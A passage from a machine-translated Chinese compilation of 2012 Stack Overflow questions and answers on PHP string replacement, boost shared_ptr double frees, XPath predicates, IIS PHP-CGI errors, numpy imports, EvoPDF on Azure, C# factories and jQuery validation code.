BigDecimal b1 =new BigDecimal(collectionFileData.getAmount(), MathContext.DECIMAL64).setScale(2, BigDecimal.ROUND_HALF_UP)  // b1= 123.12

 d = (double) Math.round(d * 100) / 100;
BigDecimal b2 = new BigDecimal(d.toString());  // b2= 123.12 
```

# php - PHP：从字符串中删除各种字符 - 最短的方法？

> ID：12460485
> 
> 赞同：1
> 
> 时间：2012-09-17T13:39:23.697
> 
> 标签：php, replace

我有一个字符串，它包含变音符号和其他要替换的字符，现在我的代码如下所示：

```
$string = preg_replace('/( +)|([()])|(\/)/', '_', $string);
$string = preg_replace('/_{1,}/', '_', $string);
$string = preg_replace('/_$/', '', $string);
$string = str_replace('ö', 'oe', $string);
$string = str_replace('ü', 'oe', $string);
$string = str_replace('ä', 'oe', $string);
$string = str_replace('Ä', 'Ae', $string);
$string = str_replace('Ü', 'Ue', $string);
$string = str_replace('Ö', 'Oe', $string); 
```

有没有更短的方法呢？

谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:43:30.937

您可以使用`str_replace`数组：

```
$find = Array(" ","(",")","/","ö","ü","ä","Ä","Ü","Ö");
$replace = Array("_","_","_","_","oe","oe","oe""Ae","Ue","Oe");
$string = str_replace($find,$replace,$string);
$string = preg_replace("/__+/","_",$string);
$string = rtrim($string,"_"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:45:33.133

“最正确”的方法是使用 PHP 的 iconv（将字符串转换为请求的字符编码）功能......

完全按照您的意愿执行的示例函数：http: [//php.net/manual/en/function.iconv.php#83238](http://php.net/manual/en/function.iconv.php#83238)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:59:15.467

就在这里。有一件事是，如果该替换表示您的应用程序中的某些内容（例如，从字符串中创建一个 slug: `string_slug`），您应该首先将它包装到它自己的函数中，这通过获取输入变量并返回输出非常简单：

```
function string_slug($string) {

    $string = preg_replace('/( +)|([()])|(\/)/', '_', $string);
    $string = preg_replace('/_{1,}/', '_', $string);
    $string = preg_replace('/_$/', '', $string);

    $string = str_replace('ö', 'oe', $string);
    $string = str_replace('ü', 'oe', $string);
    $string = str_replace('ä', 'oe', $string);
    $string = str_replace('Ä', 'Ae', $string);
    $string = str_replace('Ü', 'Ue', $string);
    $string = str_replace('Ö', 'Oe', $string);

    return $string;
} 
```

如您所见，除了将代码移入函数体之外，我还按它们调用的函数对某些行进行了分组。但这只是一个旁注。

这样替换函数的使用就不会那么繁琐且直接：

```
$string = string_slug($string); 
```

你能想象一种不太完美的方式来进行字符串操作吗？只需一行，该功能就非常适合您想要做的事情。

接下来，您询问了如何改进替换操作。那只是知识，有很多很多方法可以做到这一点。

首先，您可以提高对所使用的两个功能的了解。例如，这可以向您展示如何改进正则表达式以压缩它以及 str_replace 可以与数组一起使用（@Kolnik[在这里给出了一个示例](https://stackoverflow.com/a/12460561/367456)，但是操作顺序与您的原始代码不同）。

接下来，该`str_replace`部分正在做一些类似于翻译表的事情。用另一个替换一个。PHP 中支持这一点的函数称为[`strtr`^(*Docs*)](http://php.net/strtr)。

还要注意使用正确的编码保存 PHP 文件，否则变音符号替换（`Ä`等）可能不适用于您的情况。

此外，您可能想了解称为[*音译^(Wikipedia 的内容)*](http://en.wikipedia.org/wiki/Transliteration)。

# c++ - boost::shared_ptr 在修改后的工厂方法中

> ID：12460487
> 
> 赞同：0
> 
> 时间：2012-09-17T13:39:30.520
> 
> 标签：c++, shared-ptr

我有一个基于网络（TCP-IP）的自定义 IPC 系统。

考虑代码（以及下面的解释）：

```
#include "boost/shared_ptr.hpp"
#include <string>

using namespace std;

class TCommand {
public:
  typedef boost::shared_ptr<TCommand> Ptr;

  TCommand() {
      cout << "    Creating TCommand..." << endl;
  }

  virtual ~TCommand() {
      cout << "    Destroying TCommand..." << endl;
  }

  static TCommand * factory(int classID);

  virtual void parse(const char *data, int dataSize) = 0;
  virtual void print() = 0;
  virtual std::string getType() = 0;

};

class TPingCommand : public TCommand {
public:
  static const int classID = 1;
  int value;

  TPingCommand() : TCommand() {
      cout << "    Creating TPingCommand..." << endl;
  }

  virtual ~TPingCommand() {
      cout << "    Destroying TPingCommand..." << endl;
  }

  virtual void parse(const char *data, int dataSize) {
    if (dataSize < 4) throw 1;

    this->value = data[0] << 24 | data[1] << 16 | data[2] << 8 | data[3];
  }

  virtual void print() {
      cout << "  TPingCommand:" << endl;
      cout << "    value = " << dec << this->value << " (0x" << hex << this->value << ")" << endl;
  }

  virtual std::string getType() {
      return "TPingCommand";
  }
};

class TOtherCommand : public TCommand {
public:
  static const int classID = 2;
  int value;
  char value2;
  short int value3;

  TOtherCommand() : TCommand() {
      cout << "    Creating TOtherCommand..." << endl;
  }

  virtual ~TOtherCommand() {
      cout << "    Destroying TOtherCommand..." << endl;
  }

  virtual void parse(const char *data, int dataSize) {
    if (dataSize < 7) throw 1;

    this->value = data[0] << 24 | data[1] << 16 | data[2] << 8 | data[3];
    this->value2 = data[4];
    this->value3 = data[5] << 8 | data[6];
  }

  virtual void print() {
      cout << "  TOtherCommand:" << endl;
      cout << "    value  = " << dec << this->value << " (0x" << hex << this->value << ")" << endl;
      cout << "    value2 = " << dec << this->value2 << " (0x" << hex << (int)this->value2 << ")" << endl;
      cout << "    value3 = " << dec << this->value3 << " (0x" << hex << this->value3 << ")" << endl;
  }

  virtual std::string getType() {
      return "TOtherCommand";
  }
};

TCommand * TCommand::factory(int classID) {
    cout << "  Factory for classID = " << dec << classID << " (0x" << hex << classID << ")" << endl;
    switch (classID) {
    case TPingCommand::classID: return new TPingCommand(); break;
    case TOtherCommand::classID: return new TOtherCommand(); break;
    default: throw 1;
    }
  }

TCommand::Ptr receiveFromNetwork(int test, TCommand::Ptr knownCommand)
{
    // Receive command header from network.
    // int classID is the command class internal ID.
    // int dataSize is the command's body size in bytes.
    // For instance:
    //   int classId = 2;
    //   int datasize = 7;

    int classId = 1;
    int dataSize = 4;
    char data[10];

    if (test == 0) {
        cout << "  Using test data 0..." << endl;
        classId = 1;
        dataSize = 4;
        data[0] = 0x01; data[1] = 0x02; data[2] = 0x03; data[3] = 0x04;
    } else if (test == 1) {
        cout << "  Using test data 1..." << endl;
        classId = 2;
        dataSize = 7;
        data[0] = 0x11; data[1] = 0x12; data[2] = 0x13; data[3] = 0x14; data[4] = 0x41; data[5] = 0x16; data[6] = 0x17;
    }

    TCommand::Ptr cmd;
    if (knownCommand == 0) {
        cout << "  No command provided." << endl;
        cmd.reset(TCommand::factory(classId));
        cout << "  Command created from factory: " << cmd->getType() << endl;
    } else {
        cmd = knownCommand;
        cout << "  Command provided: " << cmd->getType() << endl;
    }

    cout << "  Parsing data..." << endl;
    cmd->parse(data, dataSize);

    // The command was identified as TOtherCommand (classID = 2).
    // The factory returned a TOtherCommand instance.
    // The TOtherCommand's parse method will check the dataSize is suitable (7 bytes are necessary).
    // The parse method will unserialize data to their fields.
    // This way, the fields would be:
    //    data = 0x11121314;
    //    data2 = 0x42; // 'A' as char.
    //    data3 = 0x1213;

  return cmd;
}

void caller() {
    // Case 1 (ok):
    // I know I'm going to receive a TPingCommand.
    cout << "Test case 1:" << endl;
    TCommand::Ptr known(new TPingCommand());
    TCommand::Ptr cmd1 = receiveFromNetwork(0, known);
    cmd1->print();

    // Case 2 (problems):
    cout << "Test case 2:" << endl;
    TCommand::Ptr dummy;
    TCommand::Ptr cmd2 = receiveFromNetwork(1, dummy);
    cmd2->print();

    cout << "Teardown..." << endl;
}

int main() {
    caller();
} 
```

receiveFromNetwork 是一种修改过的工厂方法，用于从网络接收命令，但是，在少数情况下，我先验地知道我将接收哪种类型的命令，所以我创建了它的实例并传递给函数（如 knownCommand）。命令类派生自 TCommand 类。knownCommand 由函数返回（它不是必需的，因为您将它作为参数传递，但它对其他情况很有用）。

在所有其他情况下，从网络接收到的前几个字节描述了命令 classID，我使用它在此函数中创建合适的 TCommand 实例。然后从网络数据中解析命令并在函数结束时返回。knownCommand 只是一个虚拟的 TCommand 实例。

当我通过 knownCommand 时，它运行良好。当我将一个虚拟命令作为参数传递时，它会崩溃（据我所知，双倍免费）。

我考虑过对 knownCommand 使用 TCommand 引用，但是，我不能这样做，因为我必须返回一个共享指针，它会导致相同的原始指针由两个不同的共享指针实例（一个来自调用者方法和另一个在 receiveFromNetwork 方法中）。

任何人都知道如何解决这个问题？

这是有问题的场景的部分 valgrind 输出：

```
==31859== Thread 2:
==31859== Invalid read of size 4
==31859==    at 0x805D7B0: boost::detail::sp_counted_impl_p<TVideoGetSourceSizeCommand>::dispose() (checked_delete.hpp:34)
==31859==    by 0x407FF42: Server::receiveFromNetwork() (sp_counted_base_gcc_x86.hpp:145)
==31859==    by 0x40800AF: Server::serverThread(void*) (Server.cpp:107)
==31859==    by 0x434496D: start_thread (pthread_create.c:300)
==31859==    by 0x42B398D: clone (clone.S:130) 
```

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T14:41:01.263

发现了问题。

在代码的调用部分，有一个 shared_ptr 以错误的方式“复制”。由此产生的错误是这样的：

```
boost::shared_ptr<DerivedType> ptr1(new DerivedType(...));
boost::shared_ptr<BaseType> ptr2(ptr1.get()); 
```

当然，它会导致重复的免费和程序崩溃。

代码并没有那么愚蠢，但最终那是简化的错误场景。尽管如此，这是一个微不足道的错误。

感谢所有的帮助。

# javascript - Xpath 查找匹配两个表达式的节点

> ID：12460489
> 
> 赞同：2
> 
> 时间：2012-09-17T13:39:33.127
> 
> 标签：javascript, xml, xpath

我在以下 xml 上使用 xpath，我只需要提取匹配两个表达式的节点，也许我做错了，因为没有返回节点。

```
<item>
    <title>a product</title>
    <link>http://www.aproduct.com</link>
    <description>cool product</description>
    <author>here@there.com</author>
    <id_product><![CDATA[ 6]]></id_product>
    <section><![CDATA[ industry]]></section>
</item>
<item>
    <title>another product</title>
    <link>http://www.anotherproduct.com</link>
    <description>awesome product</description>
    <author>here@there.com</author>
    <id_product><![CDATA[ 8]]></id_product>
    <section><![CDATA[ diy]]></section>
</item> 
```

我现在使用的是

```
//item/section[text() = "industry"] | //item/id_product[ text() ="6"] 
```

但我也试过

```
//item/section[ . = "industry"] | //item/id_product[ . ="8"] 
```

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:47:22.900

看起来您尝试匹配的节点中的文本以空格开头：

```
" industry"

" 8" 
```

这就是为什么`section[text() = "industry"]`不选择任何东西的原因。

你可以使用

```
//item/section[normalize-space(.) = "industry"] | ... 
```

**PS**根据您后来的评论，您要选择的似乎完全不同。您想要选择，而不是它的子元素`item`，并且您只想要*两个*条件都成立的元素，而不是*任何一个*条件都成立的元素。所以：`item`

 **```
//item[section[normalize-space(.) = "industry"] and 
       id_product[normalize-space(.) = "6"]] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:14:09.177

> 我正在尝试选择子项等于“行业”且 id_product 子项等于“6”的所有项目元素

鉴于您的示例 XML 在元素值中有前导空格，您需要`normalize-space`在比较时使用：

```
//item[normalize-space(section) = "industry"][normalize-space(id_product) = "6"] 
```

顺序中的多个谓词表达式有效地与在一起，您可以将表达式读作

1.  选择`item`文档中的所有元素
2.  过滤这组节点以仅包括那些具有`section`其空间标准化值的子节点的节点`industry`
3.  然后过滤*该*集合以仅包含那些具有`id_product`空间标准化值的孩子的集合`6`

表达式 like`//item/section[....]`会选择`section`元素，而不是它的 parent `item`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:09:20.240

您可以使用[`fn:normalize-space(string)`](http://www.w3schools.com/xpath/xpath_functions.asp)xpath 1.0 功能。

Xpath 看起来像

```
//item/section[normalize-space(.) = "industry"] 
| 
//item/id_product[ normalize-space(.) ="6"] 
```

**更新：**根据 OP 评论，我了解要根据其子项持有的值选择的所有项目节点。所以这个表达式会做

```
//item[normalize-space(section) = "industry" or normalize-space(id_product) ="6"] 
```**

# wordpress - 购买主题到定制主题？

> ID：12460490
> 
> 赞同：0
> 
> 时间：2012-09-17T13:39:39.583
> 
> 标签：wordpress, themes, wordpress-theming

我从 Themeforest 购买了一个主题，现在我想将其转换为自定义主题。我正在使用 Underscores 主题创建主题：[http](http://underscores.me/) ://underscores.me/但是如何在下一个主题中保留相同的自定义帖子类型？

这是否比重新编码购买的主题更省时？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:31:11.597

这真的取决于主题本身，有些公司销售非常好的主题，代码清晰，如主题森林的优雅主题，有些则没有。

我个人从 ElegantThemes 中重新编写了一个主题，而且时间不长。

实际上，如果您只想保留自定义帖子类型，我想我会更快地重新编码购买的主题的一部分。

# apache-flex - 为 flex 应用程序设置离线页面

> ID：12460493
> 
> 赞同：1
> 
> 时间：2012-09-17T13:39:56.180
> 
> 标签：apache-flex, app-offline.htm

我有一个 flex 应用程序，当我发布新版本时，希望将其脱机并向用户显示一个页面，该页面说明该站点正在建设中，并将在几分钟后返回。有没有办法在 flex 应用程序中设置类似的东西？我以前为 ASP 应用程序做过，希望能够为我的 flex 应用程序做同样的事情。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T16:11:43.217

假设这是一个 AIR 应用程序，您可以使用[ServiceMonitor](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/air/net/ServiceMonitor.html)类设置投票。该类将允许您以预定的时间间隔 ping 您的域以检查连接性。如果它返回状态为“Service.unavailable”的状态事件，您就知道您的站点已关闭。从那里，您可以使用[PopupManager](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/managers/PopUpManager.html)类在您的应用程序上方抛出一个新组件，以防止用户与底层应用程序交互；您的“离线页面”。

# php - PHP CGI - 未返回完整的 HTTP 标头集导致行为不端

> ID：12460496
> 
> 赞同：2
> 
> 时间：2012-09-17T13:40:01.760
> 
> 标签：php, iis-7

我有 IIS7 并试图呈现一个示例 PHP 脚本。请注意，我将 Windows 身份验证设置为 ON：

```
<?php
   echo "Content-Type: text/html";
   echo "\n";  
   echo "BEGIN\n";
   echo "END";
?> 
```

但我收到以下错误：

```
HTTP Error 502.2 - Bad Gateway
    The specified CGI application misbehaved by not returning a complete set of HTTP headers. The headers it did return are "<b>Security Alert!</b> The PHP CGI cannot be accessed directly. <p>This PHP CGI binary was compiled with force-cgi-redirect enabled. This means that a page will only be served up if the REDIRECT_STATUS CGI variable is set, e.g. via an Apache Action directive.</p> <p>For more information as to <i>why</i> this behaviour exists, see the <a href="http://php.net/security.cgi-bin">manual page for CGI security</a>.</p> <p>For more information about changing this behaviour or re-enabling this webserver, consult the installation file that came with this distribution, or visit <a href="http://php.net/install.windows">the manual page</a>.</p>"

Module  CgiModule

Notification    ExecuteRequestHandler
Handler PHP
Error Code  0x00000103
Requested URL   http://localhost:8080/phpinfo.php
Physical Path   C:\inetpub\wwwroot\phpinfo.php
Logon Method    Anonymous
Logon User  Anonymous 
```

但 ：

在 C:\PHP\php.ini 中：

```
cgi.force_redirect = 0
cgi.redirect_status_env = REDIRECT_STATUS 
```

和

```
c:\PHP>php-cgi.exe C:\inetpub\wwwroot\phpinfo.php
X-Powered-By: PHP/5.2.17
Content-type: text/html

Content-Type: text/html
BEGIN
END
c:\PHP> 
```

请让我知道我该如何解决这个问题？实际上我需要 $_SERVER['LOGON_USER'] 变量的值来知道哪个 Intranet 用户正在访问我们的 Intranet 站点？

：：更新：：

通过修改 php.ini 文件解决了这个问题 - 似乎一些默认配置设置为 OFF 需要打开：

[http://www.thesitewizard.com/php/install-php-5-apache-windows.shtml](http://www.thesitewizard.com/php/install-php-5-apache-windows.shtml)

# python - 在 ipython 中的网络驱动器上导入 numpy 失败

> ID：12460499
> 
> 赞同：3
> 
> 时间：2012-09-17T13:40:06.643
> 
> 标签：python, numpy, ipython

今天我遇到了一个奇怪的错误。我尝试在 Windows 7 下的网络驱动器上的 ipython 中导入 numpy，但失败并出现以下错误。

```
In [1]: import numpy
---------------------------------------------------------------------------
ImportError                               Traceback (most recent call last)
Z:\<ipython-input-1-5a0bd626bb1d> in <module>()
----> 1 import numpy

C:\Python27\lib\site-packages\numpy\__init__.pyc in <module>()
    141         return loader(*packages, **options)
    142
--> 143     import add_newdocs
    144     __all__ = ['add_newdocs']
    145

C:\Python27\lib\site-packages\numpy\add_newdocs.py in <module>()
      7 #       core/fromnumeric.py, core/defmatrix.py up-to-date.

      8
----> 9 from numpy.lib import add_newdoc
     10
     11 ########################################################################
#######

C:\Python27\lib\site-packages\numpy\lib\__init__.py in <module>()
     11
     12 import scimath as emath
---> 13 from polynomial import *
     14 #import convertcode

     15 from utils import *

C:\Python27\lib\site-packages\numpy\lib\polynomial.py in <module>()
     15 from numpy.lib.function_base import trim_zeros, sort_complex
     16 from numpy.lib.type_check import iscomplex, real, imag
---> 17 from numpy.linalg import eigvals, lstsq
     18
     19 class RankWarning(UserWarning):

C:\Python27\lib\site-packages\numpy\linalg\__init__.py in <module>()
     46 from info import __doc__
     47
---> 48 from linalg import *
     49
     50 from numpy.testing import Tester

C:\Python27\lib\site-packages\numpy\linalg\linalg.py in <module>()
     21         isfinite, size, finfo, absolute, log, exp
     22 from numpy.lib import triu
---> 23 from numpy.linalg import lapack_lite
     24 from numpy.matrixlib.defmatrix import matrix_power
     25 from numpy.compat import asbytes

ImportError: DLL load failed: The specified path is invalid. 
```

使用原始 python shell 和在 C:\ 驱动器上使用 ipython 一样有效。我尝试重新安装 ipython 并尝试了不同的版本，但错误仍然存​​在。我不知道这是什么原因，所以任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-06-12T17:27:25.857

我在使用 numpy 和 linalg 时遇到了类似的问题。我通过卸载 numpy 修复了它

```
pip uninstall numpy 
```

然后重新安装。

```
pip install numpy 
```

我不是从共享驱动器执行此操作，而是从本地驱动器执行此操作。

# azure - EvoPDF 库在 Windows Azure 托管站点上失败

> ID：12460500
> 
> 赞同：5
> 
> 时间：2012-09-17T13:40:07.580
> 
> 标签：azure, evopdf

EvoPDF HTML 到 PDF 转换库 (http://www.evopdf.com/) 声称它支持 Windows Azure 云平台，但我无法让它工作。我得到了例外：

```
[Exception: Could not get conversion result header. Data receive error. Could not receive data. Error code: 109]
   EvoPdf.HtmlToPdf.ImgConverter.GetLayoutFromUrl(String url, ps& htmlParseInfo) +622
   EvoPdf.HtmlToPdf.PdfConverter.ConvertAndGetPdfDocument(String url, String htmlString, String baseUrl, String internalLinksDocUrl, Boolean fromUrl) +9748
   EvoPdf.HtmlToPdf.PdfConverter.ConvertAndSaveToStream(Stream outStream, String url, String htmlString, String baseUrl, String internalLinksDocUrl, Boolean fromUrl) +61
   EvoPdf.HtmlToPdf.PdfConverter.SavePdfFromUrlToStream(String url, Stream outPdfStream) +20 
```

这看起来像是在库通过 Web 请求获取 HTML 内容时失败了。Azure 中有什么东西可以阻止传出的 Web 请求吗？

该库部署为两个 DLL，一个本机 DLL 和一个托管程序集 - 是否需要任何特殊的 Azure 配置才能加载本机 DLL？（该库确实支持 xcopy 部署，我让它在其他托管环境中以这种方式工作）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-29T12:55:58.783

据我所知，您需要使用 Azure Web 角色而不是 Azure 网站。这些站点不支持以完全信任运行。

[http://blogs.msdn.com/b/silverlining/archive/2012/06/27/windows-azure-websites-web-roles-and-vms-when-to-use-which.aspx](http://blogs.msdn.com/b/silverlining/archive/2012/06/27/windows-azure-websites-web-roles-and-vms-when-to-use-which.aspx)

EvoPdf 有一个适用于 Azure 的示例项目，您可以下载该项目，该项目展示了如何使用可以运行 EvoPdf dll 的站点设置 Web 角色。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-05-08T09:22:53.140

## 包含 .dat 文件

***您是否也将evointernal.dat***复制/包含到该站点？这为我解决了错误 109。它应该与 *.dll 文件位于同一文件夹中。

## 背景：DLL + DAT 文件

EVO HTML 到 PDF 库由三个文件组成：

*   evohtmltopdf.dll
*   evohtmltopdf.xml
*   evinternal.dat

请注意，更新 DLL 后，也要更新 evointernal.dat。否则 109 错误将再次发生。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:07:51.773

如果问题与您的本机 DLL 有关，您可能需要尝试更改[ServiceDefinition.csdef](http://msdn.microsoft.com/en-us/library/windowsazure/gg557553.aspx)中的以下属性：

*   **enableNativeCodeExecution**：确保将其设置为 true（默认为 true）
*   **executionContext**：尝试将其更改为提升

您是否部署了 64 位版本的 DLL？

我还在错误信息中看到“**错误代码：109** ”，您不能联系 EvoPDF 询问这是什么意思吗？

**更新：**如果您在 ASP.NET 中运行，您可以尝试更改信任级别吗？

```
<configuration>
  <system.web>
    <trust level="Full" />
  </system.web>
</configuration> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-08-10T07:58:59.270

用于 .NET 的 EVO HTML 到 PDF 通用库直接在 Azure Web 角色、Azure 工作者角色和 Azure 虚拟机中工作。

对于 Azure 网站，您可以使用[EVO HTML to PDF for Azure Websites 解决方案](http://www.evopdf.com/azure-html-to-pdf-converter.aspx)。从那里复制的代码示例是：

```
protected void convertToPdfButton_Click(object sender, EventArgs e)
{
    // Get the server IP and port
    String serverIP = textBoxServerIP.Text;
    uint serverPort = uint.Parse(textBoxServerPort.Text);

    // Create a HTML to PDF converter object with default settings
    HtmlToPdfConverter htmlToPdfConverter = new HtmlToPdfConverter(serverIP, serverPort);

    // Set optional service password
    if (textBoxServicePassword.Text.Length > 0)
        htmlToPdfConverter.ServicePassword = textBoxServicePassword.Text;

    // Set HTML Viewer width in pixels which is the equivalent in converter of the browser window width
    htmlToPdfConverter.HtmlViewerWidth = int.Parse(htmlViewerWidthTextBox.Text);

    // Set HTML viewer height in pixels to convert the top part of a HTML page 
    // Leave it not set to convert the entire HTML
    if (htmlViewerHeightTextBox.Text.Length > 0)
        htmlToPdfConverter.HtmlViewerHeight = int.Parse(htmlViewerHeightTextBox.Text);

    // Set PDF page size which can be a predefined size like A4 or a custom size in points 
    // Leave it not set to have a default A4 PDF page
    htmlToPdfConverter.PdfDocumentOptions.PdfPageSize = SelectedPdfPageSize();

    // Set PDF page orientation to Portrait or Landscape
    // Leave it not set to have a default Portrait orientation for PDF page
    htmlToPdfConverter.PdfDocumentOptions.PdfPageOrientation = SelectedPdfPageOrientation();

    // Set the maximum time in seconds to wait for HTML page to be loaded 
    // Leave it not set for a default 60 seconds maximum wait time
    htmlToPdfConverter.NavigationTimeout = int.Parse(navigationTimeoutTextBox.Text);

    // Set an adddional delay in seconds to wait for JavaScript or AJAX calls after page load completed
    // Set this property to 0 if you don't need to wait for such asynchcronous operations to finish
    if (conversionDelayTextBox.Text.Length > 0)
        htmlToPdfConverter.ConversionDelay = int.Parse(conversionDelayTextBox.Text);

    // The buffer to receive the generated PDF document
    byte[] outPdfBuffer = null;

    if (convertUrlRadioButton.Checked)
    {
        string url = urlTextBox.Text;

        // Convert the HTML page given by an URL to a PDF document in a memory buffer
        outPdfBuffer = htmlToPdfConverter.ConvertUrl(url);
    }
    else
    {
        string htmlString = htmlStringTextBox.Text;
        string baseUrl = baseUrlTextBox.Text;

        // Convert a HTML string with a base URL to a PDF document in a memory buffer
        outPdfBuffer = htmlToPdfConverter.ConvertHtml(htmlString, baseUrl);
    }

    // Send the PDF as response to browser

    // Set response content type
    Response.AddHeader("Content-Type", "application/pdf");

    // Instruct the browser to open the PDF file as an attachment or inline
    Response.AddHeader("Content-Disposition", String.Format("{0}; filename=Getting_Started.pdf; size={1}",
        openInlineCheckBox.Checked ? "inline" : "attachment", outPdfBuffer.Length.ToString()));

    // Write the PDF document buffer to HTTP response
    Response.BinaryWrite(outPdfBuffer);

    // End the HTTP response and stop the current page processing
    Response.End();
} 
```

# c# - 从工厂获取不同的返回类型对象

> ID：12460502
> 
> 赞同：0
> 
> 时间：2012-09-17T13:40:13.857
> 
> 标签：c#, asp.net, design-patterns

我编写了以下代码以包含 N1 和 N2 wcf 服务参考。我正在尝试编写某种工厂方法来获取代理对象的特定实例，在运行时决定。

我无法在业务代码中使用工厂分配的 proxyType out 变量，如下所示。您能否建议我缺少哪些信息？

如果我目前的方法不正确，如何使用泛型来实现这一点？或者这种场景是否有任何既定的设计模式？

```
namespace N1
{
    public class Proxy1
    {
        public void foo()
        {
            //do something 
        }
    }
}

namespace N2
{
    public class Proxy2
    {
        public void foo()
        {
            //do something 
        }
    }
}

namespace N3
{
    static class Helper
    {
        public static object getProxyInstance(int i, out Type t)
        {
            object objectToReturn = null;
            t = null;
            if (i == 1)
            {
                objectToReturn = new N1.Proxy1();
                t = typeof(N1.Proxy1);
            }
            else if (i == 2)
            {
                objectToReturn = new N2.Proxy2();
                t = typeof(N2.Proxy2);
            }
            return objectToReturn;
        }
    }
}

namespace N4
{
    class BusinessClass
    {
        public void bar()
        {
            Type proxyType;
            var proxyObj = (proxyType)N3.Helper.getProxyInstance(1, out proxyType);
        }
    }
}

var proxyObj = (**proxyType**)N3.Helper.getProxyInstance(1, out proxyType);

Type or namespace proxyType could not be found. 
```

编辑：这里的挑战是 - Proxy1 和 Proxy2 是由 Visual Studio 的添加服务引用命令生成的类。如果我更新服务参考，我的代码更改将消失，并且每次我都必须重新编写代码。因此**尝试在不包装这些代理类的情况下手动编写代码。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:55:35.597

```
public interface IProxy
{
    void Foo();
}

public class Proxy1 : IProxy
{
    public void Foo()
    {
    }
}

public class Proxy2 : IProxy
{
    public void Foo()
    {
    }
}

static class Helper
{
    public static IProxy GetProxyInstance(int i)
    {
        if (i == 1)
        {
            return new Proxy1();
        }
        else if (i == 2)
        {
            return new Proxy1();
        }
        else
        {
            return null;
        }
    }
}

class BusinessClass
{
    public void bar()
    {
        IProxy proxyObj = Helper.GetProxyInstance(1);
        proxyObj.Foo();
    }
} 
```

# javascript - 有没有办法缩短这段代码？

> ID：12460506
> 
> 赞同：-1
> 
> 时间：2012-09-17T13:40:25.993
> 
> 标签：javascript, jquery

是否有更短的方法（真的更清洁的方法）来执行我的以下代码？

```
if (whichToCheck == 1) {
    if ($('#input_3').val().length) {
        $('#error1').css('display', 'none');
        $('#error1').css('visibility', 'hidden');
        hasErrors = false;
    } else {
        $('#error1').css('display', 'block');
        $('#error1').css('visibility', 'visible');
        hasErrors = true;
    }
}
else if (whichToCheck == 2) {
    if ($('#input_4').val().length) {
        $('#error2').css('display', 'none');
        $('#error2').css('visibility', 'hidden');
        hasErrors = false;
    } else {
        $('#error2').css('display', 'block');
        $('#error2').css('visibility', 'visible');
        hasErrors = true;
    }
}
else if (whichToCheck == 3) {
    if ($('#input_5').val().length) {
        $('#error3').css('display', 'none');
        $('#error3').css('visibility', 'hidden');
        hasErrors = false;
    } else {
        $('#error3').css('display', 'block');
        $('#error3').css('visibility', 'visible');
        hasErrors = true;
    }
}
else if (whichToCheck == 4) {
    if ($('#input_7_0').is(':checked')) {
        $('#error4').css('display', 'none');
        $('#error4').css('visibility', 'hidden');
        hasErrors = false;
    } else {
        $('#error4').css('display', 'block');
        $('#error4').css('visibility', 'visible');
        hasErrors = true;
    }
}
else if (whichToCheck == 5) {
    if ($('#input_6').val().length) {
        $('#error5').css('display', 'none');
        $('#error5').css('visibility', 'hidden');
        hasErrors = false;
    } else {
        $('#error5').css('display', 'block');
        $('#error5').css('visibility', 'visible');
        hasErrors = true;
    }
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:42:32.197

首先，您应该使用 switch 块并将要修改的元素存储在变量中。精简版：

```
var input, error;
switch(whichToCheck){
    case 1:
        input=$('#input_3');
        error=$('#error1');
        break;
    case 2:
        input=$('#input_4');
        error=$('#error2');
        break;
    default:
        ...
        break;
}
var hasErrors = !!input.val().length;
if(hasErrors) error.show(); else error.hide(); 
```

或更短的结尾：

```
hasErrors&&error.show();
hasErrors||error.hide(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:47:31.340

您可以通过动态选择元素来缩短很多时间。此外，将它们放在“缓存”变量中，而不是重新创建 jQuery 实例。您可以通过传入一个对象来使用[jQuery`.css()`方法](http://api.jquery.com/css/)的简写形式。此外，您应该将这两种不同的样式放入变量中，而不是重复它们 - 尽一切努力使代码更加 DRY。

在单行中：

```
$('#error'+whichToCheck).css( (hasErrors = !$('#input_'+(2+whichToCheck)).val().length)
   ? {display: 'block', visibility: 'visible'}
   : {display: 'none', visibility: 'hidden'}
); 
```

但是，您的 id 似乎不太规则，因此我建议使用映射器（可能重复）[替代一百万个 IF 语句](https://stackoverflow.com/questions/10029089/alternative-to-a-million-if-statements/10029116#10029116)：

```
var toCheck = document.getElementById( 'input_' + {1:'3', 2:'4', 3:'5', 4:'7_0', 5:'6'}[whichToCheck] ),
    errorEl = $('#error'+whichToCheck);
hasErrors = !(toCheck.type=="checkbox" ? toCheck.checked : toCheck.value);
if (hasErrors)
    errorEl.css({display: 'block', visibility: 'visible'});
else
    errorEl.css({display: 'none', visibility: 'hidden'}); 
```

此外，您不需要设置`display` *and* `visibility`，如果您使用 jQuery 的`.hide()`/`.show()`它也适用于非块元素：

```
errorEl[hasErrors ? "show" : "hide"](); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-17T13:43:22.693

执行这些 if..then...else 语句的**更好**方法是使用`switch`语句。特别是当您正在寻找多个值时......

```
switch(whichToCheck){
  case "1":
    // when whichToCheck == 1
  break;
  case "2":
    // when whichToCheck == 2
  break;
  default:
    // when the value of whichToCheck doesn't match any expected value
  break;
} 
```

您可以做的另一件事来减少您拥有的代码是使用 jQuery`show()`和`hide()`函数来...嗯...隐藏和显示元素:) 您实际上不必显式设置`display`and`visibility`属性。

参考 -

